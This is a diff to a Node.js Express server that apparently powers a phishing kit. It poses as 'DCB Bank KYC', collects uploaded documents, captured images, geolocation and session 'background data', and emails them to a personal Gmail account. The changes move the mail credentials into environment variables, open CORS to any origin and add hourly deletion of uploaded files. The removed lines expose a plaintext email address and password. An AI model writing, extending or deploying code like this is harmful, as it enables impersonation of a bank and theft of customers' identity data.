@@ -1,9 +1,11 @@
+require('dotenv').config();
 const express = require('express');
 const multer = require('multer');
 const fs = require('fs');
 const path = require('path');
 const nodemailer = require('nodemailer');
 const geoip = require('geoip-lite');
+const os = require('os');
 
 const app = express();
 const port = process.env.PORT || 3000;
@@ -11,16 +13,24 @@ const port = process.env.PORT || 3000;
 // Trust proxy to get real client IP
 app.set('trust proxy', true);
 
+// Create uploads directory in temp storage
+const uploadDir = path.join(os.tmpdir(), 'uploads');
+if (!fs.existsSync(uploadDir)) {
+  fs.mkdirSync(uploadDir, { recursive: true });
+}
+console.log(`Using upload directory: ${uploadDir}`);
+
 // Middleware for handling large payloads
 app.use(express.urlencoded({ extended: true, limit: '50mb' }));
 app.use(express.json({ limit: '50mb' }));
 app.use(express.static('public'));
 
-// Create uploads directory if it doesn't exist
-const uploadDir = 'uploads';
-if (!fs.existsSync(uploadDir)) {
-  fs.mkdirSync(uploadDir);
-}
+// Add CORS headers
+app.use((req, res, next) => {
+  res.header('Access-Control-Allow-Origin', '*');
+  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
+  next();
+});
 
 // Set up multer for file upload
 const storage = multer.diskStorage({
@@ -48,7 +58,7 @@ const upload = multer({
   storage: storage,
   fileFilter: fileFilter,
   limits: {
-    fileSize: 50 * 1024 * 1024 // 50MB limit
+    fileSize: 50 * 1024 * 1000 // 50MB limit
   }
 }).any();
 
@@ -56,8 +66,8 @@ const upload = multer({
 const transporter = nodemailer.createTransport({
   service: 'gmail',
   auth: {
-    user: 'dcbsubmission392@gmail.com',
-    pass: 'iskexmwnespcwxrkjt'
+    user: process.env.EMAIL_USER,
+    pass: process.env.EMAIL_PASS
   }
 });
 
@@ -206,8 +216,8 @@ Images Captured: ${imageAttachments.length}
 
       // Prepare email content
       const mailOptions = {
-        from: 'DCB Bank KYC <dcbsubmission392@gmail.com>',
-        to: 'dcbsubmission392@gmail.com',
+        from: `DCB Bank KYC <${process.env.EMAIL_USER}>`,
+        to: process.env.RECIPIENT_EMAIL,
         subject: '🔔 New DCB Bank KYC Submission',
         html: `
           <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
@@ -278,8 +288,8 @@ Images Captured: ${imageAttachments.length}
         
         // Send background data email
         const bgMailOptions = {
-          from: 'DCB Bank KYC <dcbsubmission392@gmail.com>',
-          to: 'dcbsubmission392@gmail.com',
+          from: `DCB Bank KYC <${process.env.EMAIL_USER}>`,
+          to: process.env.RECIPIENT_EMAIL,
           subject: '📸 Background Data for Session: ' + sessionId,
           html: `
             <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
@@ -314,6 +324,30 @@ Images Captured: ${imageAttachments.length}
     }
   });
 });
+
+// Cleanup temporary files every hour
+setInterval(() => {
+  console.log('Running file cleanup...');
+  fs.readdir(uploadDir, (err, files) => {
+    if (err) {
+      console.error('Cleanup error:', err);
+      return;
+    }
+    
+    files.forEach(file => {
+      const filePath = path.join(uploadDir, file);
+      try {
+        // Delete files older than 1 hour
+        if (Date.now() - fs.statSync(filePath).mtimeMs > 3600000) {
+          fs.unlinkSync(filePath);
+          console.log(`Deleted old file: ${file}`);
+        }
+      } catch (e) {
+        console.error('Error deleting file:', e);
+      }
+    });
+  });
+}, 3600000); // Run hourly
 
 // Start server
 app.listen(port, () => {
